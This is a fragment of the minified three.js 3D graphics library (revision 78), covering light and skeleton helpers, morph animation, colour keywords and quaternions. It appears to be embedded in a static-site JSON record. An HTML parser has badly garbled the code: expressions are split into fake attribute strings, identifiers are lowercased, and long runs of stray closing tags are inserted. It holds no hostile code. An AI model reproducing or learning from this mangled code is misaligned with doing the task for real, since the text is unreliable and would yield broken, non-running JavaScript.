function(){this.colors[0].copy(this.light.color).multiplyScalar(this.light.intensity);this.colors[1].copy(this.light.groundColor).multiplyScalar(this.light.intensity);this.lightSphere.lookAt(a.setFromMatrixPosition(this.light.matrixWorld).negate());this.lightSphere.geometry.colorsNeedUpdate=!0}}();\nTHREE.PointLightHelper=function(a,b){this.light=a;this.light.updateMatrixWorld();var c=new THREE.SphereBufferGeometry(b,4,2),d=new THREE.MeshBasicMaterial({wireframe:!0,fog:!1});d.color.copy(this.light.color).multiplyScalar(this.light.intensity);THREE.Mesh.call(this,c,d);this.matrix=this.light.matrixWorld;this.matrixAutoUpdate=!1};THREE.PointLightHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.PointLightHelper.prototype.constructor=THREE.PointLightHelper;\nTHREE.PointLightHelper.prototype.dispose=function(){this.geometry.dispose();this.material.dispose()};THREE.PointLightHelper.prototype.update=function(){this.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)};\nTHREE.SkeletonHelper=function(a){this.bones=this.getBoneList(a);for(var b=new THREE.Geometry,c=0;c<this.bones.length;c++)this.bones[c].parent instanceof=\"\" three.bone&&(b.vertices.push(new=\"\" three.vector3),b.vertices.push(new=\"\" three.vector3),b.colors.push(new=\"\" three.color(0,0,1)),b.colors.push(new=\"\" three.color(0,1,0)));b.dynamic=\"!0;c=new\" three.linebasicmaterial({vertexcolors:three.vertexcolors,depthtest:!1,depthwrite:!1,transparent:!0});three.linesegments.call(this,b,c);this.root=\"a;this.matrix=a.matrixWorld;\" this.matrixautoupdate=\"!1;this.update()};THREE.SkeletonHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.SkeletonHelper.prototype.constructor=THREE.SkeletonHelper;THREE.SkeletonHelper.prototype.getBoneList=function(a){var\" b=\"[];a\" three.bone&&b.push(a);for(var=\"\" c=\"0;c<a.children.length;c++)b.push.apply(b,this.getBoneList(a.children[c]));return\" b};=\"\" three.skeletonhelper.prototype.update=\"function(){for(var\" a=\"this.geometry,b=(new\" three.matrix4).getinverse(this.root.matrixworld),c=\"new\" three.matrix4,d=\"0,e=0;e<this.bones.length;e++){var\" f=\"this.bones[e];f.parent\" three.bone&&(c.multiplymatrices(b,f.matrixworld),a.vertices[d].setfrommatrixposition(c),c.multiplymatrices(b,f.parent.matrixworld),a.vertices[d+1].setfrommatrixposition(c),d+=\"2)}a.verticesNeedUpdate=!0;a.computeBoundingSphere()};\" three.spotlighthelper=\"function(a){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;a=new\" three.buffergeometry;for(var=\"\">c;c++,d++){var e=c/32*Math.PI*2,f=d/32*Math.PI*2;b.push(Math.cos(e),Math.sin(e),1,Math.cos(f),Math.sin(f),1)}a.addAttribute(\"position\",new THREE.Float32Attribute(b,3));b=new THREE.LineBasicMaterial({fog:!1});this.cone=new THREE.LineSegments(a,\nb);this.add(this.cone);this.update()};THREE.SpotLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.SpotLightHelper.prototype.constructor=THREE.SpotLightHelper;THREE.SpotLightHelper.prototype.dispose=function(){this.cone.geometry.dispose();this.cone.material.dispose()};\nTHREE.SpotLightHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(){var c=this.light.distance?this.light.distance:1E3,d=c*Math.tan(this.light.angle);this.cone.scale.set(d,d,c);a.setFromMatrixPosition(this.light.matrixWorld);b.setFromMatrixPosition(this.light.target.matrixWorld);this.cone.lookAt(b.sub(a));this.cone.material.color.copy(this.light.color).multiplyScalar(this.light.intensity)}}();\nTHREE.VertexNormalsHelper=function(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16711680;d=void 0!==d?d:1;b=0;c=this.object.geometry;c instanceof THREE.Geometry?b=3*c.faces.length:c instanceof THREE.BufferGeometry&&(b=c.attributes.normal.count);c=new THREE.BufferGeometry;b=new THREE.Float32Attribute(6*b,3);c.addAttribute(\"position\",b);THREE.LineSegments.call(this,c,new THREE.LineBasicMaterial({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()};\nTHREE.VertexNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.VertexNormalsHelper.prototype.constructor=THREE.VertexNormalsHelper;\nTHREE.VertexNormalsHelper.prototype.update=function(){var a=new THREE.Vector3,b=new THREE.Vector3,c=new THREE.Matrix3;return function(){var d=[\"a\",\"b\",\"c\"];this.object.updateMatrixWorld(!0);c.getNormalMatrix(this.object.matrixWorld);var e=this.object.matrixWorld,f=this.geometry.attributes.position,g=this.object.geometry;if(g instanceof THREE.Geometry)for(var h=g.vertices,k=g.faces,l=g=0,n=k.length;l<n;l++)for(var p=\"k[l],m=0,q=p.vertexNormals.length;m<q;m++){var\" r=\"p.vertexNormals[m];a.copy(h[p[d[m]]]).applyMatrix4(e);\" b.copy(r).applymatrix3(c).normalize().multiplyscalar(this.size).add(a);f.setxyz(g,a.x,a.y,a.z);g+=\"1;f.setXYZ(g,b.x,b.y,b.z);g+=1}else\" if(g=\"\" instanceof=\"\" three.buffergeometry)for(d=\"g.attributes.position,h=g.attributes.normal,m=g=0,q=d.count;m<q;m++)a.set(d.getX(m),d.getY(m),d.getZ(m)).applyMatrix4(e),b.set(h.getX(m),h.getY(m),h.getZ(m)),b.applyMatrix3(c).normalize().multiplyScalar(this.size).add(a),f.setXYZ(g,a.x,a.y,a.z),g+=1,f.setXYZ(g,b.x,b.y,b.z),g+=1;f.needsUpdate=!0;return\" this}}();=\"\" three.wireframehelper=\"function(a,b){var\" c=\"void\" 0!=\"=b?b:16777215;THREE.LineSegments.call(this,new\" three.wireframegeometry(a.geometry),new=\"\" three.linebasicmaterial({color:c}));this.matrix=\"a.matrixWorld;this.matrixAutoUpdate=!1};THREE.WireframeHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.WireframeHelper.prototype.constructor=THREE.WireframeHelper;THREE.ImmediateRenderObject=function(a){THREE.Object3D.call(this);this.material=a;this.render=function(a){}};\" three.immediaterenderobject.prototype=\"Object.create(THREE.Object3D.prototype);THREE.ImmediateRenderObject.prototype.constructor=THREE.ImmediateRenderObject;THREE.MorphBlendMesh=function(a,b){THREE.Mesh.call(this,a,b);this.animationsMap={};this.animationsList=[];var\" three.morphblendmesh.prototype.createanimation=\"function(a,b,c,d){b={start:b,end:c,length:c-b+1,fps:d,duration:(c-b)/d,lastFrame:0,currentFrame:0,active:!1,time:0,direction:1,weight:1,directionBackwards:!1,mirroredLoop:!1};this.animationsMap[a]=b;this.animationsList.push(b)};\" three.morphblendmesh.prototype.autocreateanimations=\"function(a){for(var\" b=\"/([a-z]+)_?(\\d+)/i,c,d={},e=this.geometry,f=0,g=e.morphTargets.length;f<g;f++){var\" h=\"e.morphTargets[f].name.match(b);if(h&&1<h.length){var\" k=\"h[1];d[k]||(d[k]={start:Infinity,end:-Infinity});h=d[k];f<h.start&&(h.start=f);f\">h.end&&(h.end=f);c||(c=k)}}for(k in d)h=d[k],this.createAnimation(k,h.start,h.end,a);this.firstAnimation=c};\nTHREE.MorphBlendMesh.prototype.setAnimationDirectionForward=function(a){if(a=this.animationsMap[a])a.direction=1,a.directionBackwards=!1};THREE.MorphBlendMesh.prototype.setAnimationDirectionBackward=function(a){if(a=this.animationsMap[a])a.direction=-1,a.directionBackwards=!0};THREE.MorphBlendMesh.prototype.setAnimationFPS=function(a,b){var c=this.animationsMap[a];c&&(c.fps=b,c.duration=(c.end-c.start)/c.fps)};\nTHREE.MorphBlendMesh.prototype.setAnimationDuration=function(a,b){var c=this.animationsMap[a];c&&(c.duration=b,c.fps=(c.end-c.start)/c.duration)};THREE.MorphBlendMesh.prototype.setAnimationWeight=function(a,b){var c=this.animationsMap[a];c&&(c.weight=b)};THREE.MorphBlendMesh.prototype.setAnimationTime=function(a,b){var c=this.animationsMap[a];c&&(c.time=b)};THREE.MorphBlendMesh.prototype.getAnimationTime=function(a){var b=0;if(a=this.animationsMap[a])b=a.time;return b};\nTHREE.MorphBlendMesh.prototype.getAnimationDuration=function(a){var b=-1;if(a=this.animationsMap[a])b=a.duration;return b};THREE.MorphBlendMesh.prototype.playAnimation=function(a){var b=this.animationsMap[a];b?(b.time=0,b.active=!0):console.warn(\"THREE.MorphBlendMesh: animation[\"+a+\"] undefined in .playAnimation()\")};THREE.MorphBlendMesh.prototype.stopAnimation=function(a){if(a=this.animationsMap[a])a.active=!1};\nTHREE.MorphBlendMesh.prototype.update=function(a){for(var b=0,c=this.animationsList.length;b<c;b++){var d=\"this.animationsList[b];if(d.active){var\" e=\"d.duration/d.length;d.time+=d.direction*a;if(d.mirroredLoop){if(d.time\">d.duration||0>d.time)d.direction*=-1,d.time>d.duration&&(d.time=d.duration,d.directionBackwards=!0),0>d.time&&(d.time=0,d.directionBackwards=!1)}else d.time%=d.duration,0>d.time&&(d.time+=d.duration);var f=d.start+THREE.Math.clamp(Math.floor(d.time/e),0,d.length-1),g=d.weight;f!==d.currentFrame&&\n(this.morphTargetInfluences[d.lastFrame]=0,this.morphTargetInfluences[d.currentFrame]=1*g,this.morphTargetInfluences[f]=0,d.lastFrame=d.currentFrame,d.currentFrame=f);e=d.time%e/e;d.directionBackwards&&(e=1-e);d.currentFrame!==d.lastFrame?(this.morphTargetInfluences[d.currentFrame]=e*g,this.morphTargetInfluences[d.lastFrame]=(1-e)*g):this.morphTargetInfluences[d.currentFrame]=g}}};\n</c;b++){var></n;l++)for(var></this.bones.length;c++)this.bones[c].parent></h;g++)b.vertices[a[g]].copy(d)}var></c.y?this.quaternion.set(0,0,0,1):-.99999></l;a++)for(p=0;3></n;++g){a=e[g];p=a.start;m=a.count;a=p;for(var></l;a++)for(p=0;2></n;l++)this.vertices[l].multiplyscalar(c);this.mergevertices();this.computefacenormals();this.boundingsphere=new></n;l+=3)e(new></e[0].dot(h.crossvectors(f[0],f[b-1]))&&(d=-d),l=1;l<b;l++)f[l].applymatrix4(k.makerotationaxis(e[l],d*l)),g[l].crossvectors(e[l],f[l])};></d;c++)this.addshape(a[c],b);return></f;e++){var></-number.epsilon?f<-number.epsilon&&(a=!0):math.sign(e)===math.sign(g)&&(a=!0),a?(c=-e,a=d,d=math.sqrt(h)):(c=d,a=e,d=math.sqrt(h></=d)l=k[g.vert1],e.push(l.x),e.push(l.y),e.push(l.z),l=k[g.vert2],e.push(l.x),e.push(l.y),e.push(l.z);this.addattribute(\"position\",new></q;g++)for(var></h?0:(math.floor(math.abs(h)></=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return></g.y||a.y></d;c++)b+=this.curves[c].getlength(),a.push(b);return></a&&(a=1);b=this.getpoint(b);return></k)h=d-1;else{h=d;break}d=h;if(c[d]===f)return></=a;b++)c.push(this.getpoint(b></h.length;p++){z=h[p];n=-1;for(p=0;p<l.length;p++)if(y=l[p],a=z.x+\":\"+z.y+\":\"+y,void></h.length;c++)if(e=c+1,e%=h.length,e=d(a,b,h[c],h[e],!0),0<e.length)return!0;return!1}function></a?0<=e&&0<=b:0<=e||0<=b):0<e}var></=d?[g,h]:[g,l]}function></a||a<y)return[];k=l*n-k*p;if(0<k||k<y)return[]}if(0===k)return!f||0!==a&&a!==y?[a]:[];if(k===y)return!f||0!==a&&a!==y?[b]:[];if(0===a)return[d];if(a===y)return[e];f=k></y){if(0></c;g++,k++)e[g]=e[k];c--;l=2*c}}return></c;n++)if(u=a[e[n]].x,v=a[e[n]].y,!(u===p&&v===m||u===q&&v===r||u===s&&v===t)&&(i=u-p,b=v-m,f=u-q,k=v-r,u-=s,v-=t,f=c*k-w*f,i=y*b-a*i,b=e*v-z*u,f></=g&&(g=0);h=g+1;c<=h&&(h=0);k=h+1;c<=k&&(k=0);var></three.shapeutils.area(a))for(h=0;h<c;h++)e[h]=h;else></n;o++){var></e)return></h;m++)k=p[m],b.format!==three.rgbaformat&&b.format!==three.rgbformat?-1<c.getcompressedtextureformats().indexof(b)?c.compressedteximage2d(a.texture_cube_map_positive_x+s,m,b,k.width,k.height,0,k.data):console.warn(\"three.webglrenderer:></b.version&&m.__version!==b.version){var></parseint(c);b++)a+=d.replace(></\"+></m;p+=3){var></=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&x.readpixels(b,c,d,e,u(k.format),u(k.type),f):console.error(\"three.webglrenderer.readrendertargetpixels:></c;b++)this.lensflares.push(a.lensflares[b]);return></f;e++)d[e].object.visible=!1}}}(),tojson:function(a){a=three.object3d.prototype.tojson.call(this,a);a.object.levels=[];for(var></k;f+=3){if(u=z[f],i=z[f+1],b=z[f+2],a=c(this,v,e,w,y,u,i,b))a.faceindex=math.floor(f></this.geometry.morphtargets.length){this.morphtargetbase=-1;this.morphtargetinfluences=[];this.morphtargetdictionary={};for(var></d.near||s></l-1;g+=p)s=b.distancesqtosegment(k[g],k[g+1],n,h),s></d.near||s></r;g+=p)k.fromarray(q,3*g),l.fromarray(q,3*g+3),s=b.distancesqtosegment(k,l,n,h),s></d.near||s></q;p++){var></n){var></a.y)switch(this.wrapt){case></a.x)switch(this.wraps){case></this.alphatest&&(d.alphatest=this.alphatest);!0===this.premultipliedalpha&&(d.premultipliedalpha=this.premultipliedalpha);!0===this.wireframe&&(d.wireframe=this.wireframe);1<this.wireframelinewidth&&(d.wireframelinewidth=this.wireframelinewidth);c&&(c=b(a.textures),></g;d+=b)c.skinweights.push(new></e;d++)for(t=a.uvs[d],c.facevertexuvs[d][h]=[],g=0;3></d;c+=2){var></=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){three.quaternion.slerpflat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var></=f;++e){var></d){var></this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return></a?c:0,this._mixer.dispatchevent({type:\"finished\",action:this,direction:0<a?1:-1})):(0===g?(a=0></=a?(e=0,this._setendings(!0,0===this.repetitions,></a){b=this._interpolants;for(var></=f;f--)for(e=a[f],this.faces.splice(e,></b[e]?d=e:c=e+1;d=b[c];e=b[c-1];if(void></d;)e=c+d></f&&(c=2,e=f);for(f=c-2;;){if(void></b.length;k++){b[k].closestpointtopoint(c,!0,d);var></c;a++)b=this.points[a],d[a]=[b.x,b.y,b.z];return></a.length;b++)this.points[b]={x:a[b][0],y:a[b][1],z:a[b][2]}};this.getpoint=function(a){e=(this.points.length-1)*a;f=math.floor(e);g=e-f;c[0]=0===f?f:f-1;c[1]=f;c[2]=f></=b)return></=b)return></b},intersectsbox:function(a){return></a||0></f?void></f.normal.x?c.min.x:c.max.x;b.x=0<f.normal.x?></a)return!1;return!0},intersectsbox:function(){var></=this.radius*this.radius},distancetopoint:function(a){return></g;f++)e=math.max(e,d.distancetosquared(b[f]));this.radius=math.sqrt(e);return></=c?c:d,b)},intersectsbox:function(){var></d||d!==d)d=g;return></d||d!==></=d?(c=(a.min.x-h.x)*d,d*=a.max.x-h.x):(c=(a.max.x-h.x)*d,d*=a.min.x-h.x);0<=f?(e=(a.min.y-h.y)*f,f*=a.max.y-h.y):(e=(a.max.y-h.y)*f,f*=a.min.y-h.y);if(c></=a.radius},distancetoplane:function(a){var></=q?(h=1></m?(d=k*n-l,e=k*l-n,q=h*m,0<=d?e></arguments.length&&console.error(\"three.matrix3:></=b.radius*b.radius}}(),intersectsplane:function(a){var></this.min.y||a.min.y></=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z?!0:!1},getparameter:function(a,b){return(b||new></this.min.y||a.y></c;b++)this.expandbypoint(a[b]);return></k;h+=3){var></this.min.y||a.min.y></=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y?!0:!1},getparameter:function(a,b){return(b||new></this.min.y||a.y></c;b++)this.expandbypoint(a[b]);return></=m?1:-1,r=1-m*m;r></=g)return></d?6:0);break;case></a.length&&></2></d&&(d-=1);return></a?1:+a});void>","site":{"data":{}},"excerpt":"","more":"// threejs.org/license\n'use strict';var THREE={REVISION:\"78\"};\"function\"===typeof define&&define.amd?define(\"three\",THREE):\"undefined\"!==typeof exports&&\"undefined\"!==typeof module&&(module.exports=THREE);void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52));void 0===Math.sign&&(Math.sign=function(a){return 0>a?-1:0<a?1:+a});void 0=\"==Function.prototype.name&&Object.defineProperty(Function.prototype,\"name\",{get:function(){return\" this.tostring().match(=\"\" ^\\s*function\\s*(\\s*)\\s*\\(=\"\" )[1]}});=\"\" void=\"\" new=\"\" typeerror(\"cannot=\"\" convert=\"\" undefined=\"\" or=\"\" null=\"\" to=\"\" object\");for(var=\"\" b=\"Object(a),c=1;c<arguments.length;c++){var\" d=\"arguments[c];if(void\" 0!=\"=d&&null!==d)for(var\" e=\"\" in=\"\" d)object.prototype.hasownproperty.call(d,e)&&(b[e]=\"d[e])}return\" b}}();=\"\" object.assign(three,{mouse:{left:0,middle:1,right:2},cullfacenone:0,cullfaceback:1,cullfacefront:2,cullfacefrontback:3,frontfacedirectioncw:0,frontfacedirectionccw:1,basicshadowmap:0,pcfshadowmap:1,pcfsoftshadowmap:2,frontside:0,backside:1,doubleside:2,flatshading:1,smoothshading:2,nocolors:0,facecolors:1,vertexcolors:2,noblending:0,normalblending:1,additiveblending:2,subtractiveblending:3,multiplyblending:4,customblending:5,addequation:100,subtractequation:101,reversesubtractequation:102,minequation:103,=\"\" maxequation:104,zerofactor:200,onefactor:201,srccolorfactor:202,oneminussrccolorfactor:203,srcalphafactor:204,oneminussrcalphafactor:205,dstalphafactor:206,oneminusdstalphafactor:207,dstcolorfactor:208,oneminusdstcolorfactor:209,srcalphasaturatefactor:210,neverdepth:0,alwaysdepth:1,lessdepth:2,lessequaldepth:3,equaldepth:4,greaterequaldepth:5,greaterdepth:6,notequaldepth:7,multiplyoperation:0,mixoperation:1,addoperation:2,notonemapping:0,lineartonemapping:1,reinhardtonemapping:2,uncharted2tonemapping:3,=\"\" cineontonemapping:4,uvmapping:300,cubereflectionmapping:301,cuberefractionmapping:302,equirectangularreflectionmapping:303,equirectangularrefractionmapping:304,sphericalreflectionmapping:305,cubeuvreflectionmapping:306,cubeuvrefractionmapping:307,repeatwrapping:1e3,clamptoedgewrapping:1001,mirroredrepeatwrapping:1002,nearestfilter:1003,nearestmipmapnearestfilter:1004,nearestmipmaplinearfilter:1005,linearfilter:1006,linearmipmapnearestfilter:1007,linearmipmaplinearfilter:1008,unsignedbytetype:1009,=\"\" bytetype:1010,shorttype:1011,unsignedshorttype:1012,inttype:1013,unsignedinttype:1014,floattype:1015,halffloattype:1025,unsignedshort4444type:1016,unsignedshort5551type:1017,unsignedshort565type:1018,alphaformat:1019,rgbformat:1020,rgbaformat:1021,luminanceformat:1022,luminancealphaformat:1023,rgbeformat:three.rgbaformat,depthformat:1026,rgb_s3tc_dxt1_format:2001,rgba_s3tc_dxt1_format:2002,rgba_s3tc_dxt3_format:2003,rgba_s3tc_dxt5_format:2004,rgb_pvrtc_4bppv1_format:2100,rgb_pvrtc_2bppv1_format:2101,=\"\" rgba_pvrtc_4bppv1_format:2102,rgba_pvrtc_2bppv1_format:2103,rgb_etc1_format:2151,looponce:2200,looprepeat:2201,looppingpong:2202,interpolatediscrete:2300,interpolatelinear:2301,interpolatesmooth:2302,zerocurvatureending:2400,zeroslopeending:2401,wraparoundending:2402,trianglesdrawmode:0,trianglestripdrawmode:1,trianglefandrawmode:2,linearencoding:3e3,srgbencoding:3001,gammaencoding:3007,rgbeencoding:3002,logluvencoding:3003,rgbm7encoding:3004,rgbm16encoding:3005,rgbdencoding:3006,basicdepthpacking:3200,=\"\" rgbadepthpacking:3201});three.color=\"function(a,b,c){return\" three.color.prototype=\"{constructor:THREE.Color,r:1,g:1,b:1,set:function(a){a\" instanceof=\"\" three.color?this.copy(a):\"number\"=\"==typeof\" a?this.sethex(a):\"string\"=\"==typeof\" a&&this.setstyle(a);return=\"\" this},setscalar:function(a){this.b=\"this.g=this.r=a},setHex:function(a){a=Math.floor(a);this.r=(a\">>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(){function a(a,c,d){0>d&&(d+=1);1<d&&(d-=1);return d<1=\"\" 6?a+6*(c-a)*=\"\" d:.5=\"\">d?c:d<2 3?a+6*(c-a)*(2=\"\" 3-d):a}return=\"\" function(b,c,d){b=\"THREE.Math.euclideanModulo(b,1);c=THREE.Math.clamp(c,0,1);d=THREE.Math.clamp(d,0,1);0===c?this.r=this.g=this.b=d:(c=.5\">=d?d*(1+c):d+c-d*c,d=2*d-c,this.r=a(d,c,b+1/3),this.g=a(d,c,b),this.b=a(d,c,b-1/3));return this}}(),setStyle:function(a){function b(b){void 0!==b&&1>parseFloat(b)&&console.warn(\"THREE.Color: Alpha component of \"+a+\" will be ignored.\")}var c;if(c=/^((?:rgb|hsl)a?)\\(\\s*([^\\)]*)\\)/.exec(a)){var d=c[2];switch(c[1]){case \"rgb\":case \"rgba\":if(c=\n/^(\\d+)\\s*,\\s*(\\d+)\\s*,\\s*(\\d+)\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(255,parseInt(c[1],10))/255,this.g=Math.min(255,parseInt(c[2],10))/255,this.b=Math.min(255,parseInt(c[3],10))/255,b(c[5]),this;if(c=/^(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d))return this.r=Math.min(100,parseInt(c[1],10))/100,this.g=Math.min(100,parseInt(c[2],10))/100,this.b=Math.min(100,parseInt(c[3],10))/100,b(c[5]),this;break;case \"hsl\":case \"hsla\":if(c=/^([0-9]*\\.?[0-9]+)\\s*,\\s*(\\d+)\\%\\s*,\\s*(\\d+)\\%\\s*(,\\s*([0-9]*\\.?[0-9]+)\\s*)?$/.exec(d)){var d=\nparseFloat(c[1])/360,e=parseInt(c[2],10)/100,f=parseInt(c[3],10)/100;b(c[5]);return this.setHSL(d,e,f)}}}else if(c=/^\\#([A-Fa-f0-9]+)$/.exec(a)){c=c[1];d=c.length;if(3===d)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===d)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}a&&0<a.length&& 0=\"==b&&(b=2);this.r=Math.pow(a.r,b);this.g=Math.pow(a.g,b);this.b=Math.pow(a.b,b);return\" (c=\"THREE.ColorKeywords[a],void\" 0!=\"=c?this.setHex(c):console.warn(\"THREE.Color:\" unknown=\"\" color=\"\" \"+a));return=\"\" this},clone:function(){return=\"\" new=\"\" this.constructor(this.r,this.g,this.b)},copy:function(a){this.r=\"a.r;this.g=a.g;this.b=a.b;return\" this},copygammatolinear:function(a,b){void=\"\" this},copylineartogamma:function(a,b){void=\"\" c=\"0<b?1/b:1;this.r=Math.pow(a.r,c);this.g=Math.pow(a.g,c);this.b=Math.pow(a.b,\" c);return=\"\" this},convertgammatolinear:function(){var=\"\" a=\"this.r,b=this.g,c=this.b;this.r=a*a;this.g=b*b;this.b=c*c;return\" this},convertlineartogamma:function(){this.r=\"Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return\" this},gethex:function(){return=\"\" 255*this.r<<16^255*this.g<<8^255*this.b<<0},gethexstring:function(){return(\"000000\"+this.gethex().tostring(16)).slice(-6)},gethsl:function(a){a=\"a||{h:0,s:0,l:0};var\" b=\"this.r,c=this.g,d=this.b,e=Math.max(b,c,d),f=Math.min(b,c,d),g,h=\" (f+e)=\"\" 2;if(f=\"==e)f=g=0;else{var\" k=\"e-f,f=.5\">=h?k/(e+f):k/(2-e-f);switch(e){case b:g=(c-d)/k+(c<d?6:0);break;case 0=\"==b&&(b=0);this.r=a[b];this.g=a[b+1];this.b=a[b+2];return\" c:g=\"(d-b)/k+2;break;case\" d:g=\"(b-c)/k+4}g/=6}a.h=g;a.s=f;a.l=h;return\" a},getstyle:function(){return\"rgb(\"+(255*this.r|0)+\",\"+(255*this.g|0)+\",\"+(255*this.b|0)+\")\"},offsethsl:function(a,b,c){var=\"\" d=\"this.getHSL();d.h+=a;d.s+=b;d.l+=c;this.setHSL(d.h,d.s,d.l);return\" this},add:function(a){this.r+=\"a.r;this.g+=a.g;this.b+=a.b;return\" this},addcolors:function(a,b){this.r=\"a.r+b.r;this.g=a.g+b.g;this.b=\" a.b+b.b;return=\"\" this},addscalar:function(a){this.r+=\"a;this.g+=a;this.b+=a;return\" this},multiply:function(a){this.r*=\"a.r;this.g*=a.g;this.b*=a.b;return\" this},multiplyscalar:function(a){this.r*=\"a;this.g*=a;this.b*=a;return\" this},lerp:function(a,b){this.r+=\"(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return\" this},equals:function(a){return=\"\" a.r=\"==this.r&&a.g===this.g&&a.b===this.b},fromArray:function(a,b){void\" this},toarray:function(a,=\"\" b){void=\"\" a}};=\"\" three.colorkeywords=\"{aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,\" darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,=\"\" grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,=\"\" lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,=\"\" palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,=\"\" tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};three.quaternion=\"function(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._w=void\" 0!=\"=d?d:1};\" three.quaternion.prototype=\"{constructor:THREE.Quaternion,get\" x(){return=\"\" this._x},set=\"\" x(a){this._x=\"a;this.onChangeCallback()},get\" y(){return=\"\" this._y},set=\"\" y(a){this._y=\"a;this.onChangeCallback()},get\" z(){return=\"\" this._z},set=\"\" z(a){this._z=\"a;this.onChangeCallback()},get\" w(){return=\"\" this._w},set=\"\" w(a){this._w=\"a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._w=d;this.onChangeCallback();return\" this},clone:function(){return=\"\" new=\"\" this.constructor(this._x,this._y,this._z,this._w)},=\"\" copy:function(a){this._x=\"a.x;this._y=a.y;this._z=a.z;this._w=a.w;this.onChangeCallback();return\" this},setfromeuler:function(a,b){if(!1=\"==a\" instanceof=\"\" three.euler)throw=\"\" error(\"three.quaternion:=\"\" .setfromeuler()=\"\" now=\"\" expects=\"\" a=\"\" euler=\"\" rotation=\"\" rather=\"\" than=\"\" vector3=\"\" and=\"\" order.\");var=\"\" c=\"Math.cos(a._x/2),d=Math.cos(a._y/2),e=Math.cos(a._z/2),f=Math.sin(a._x/2),g=Math.sin(a._y/2),h=Math.sin(a._z/2),k=a.order;\"XYZ\"===k?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"YXZ\"===\" 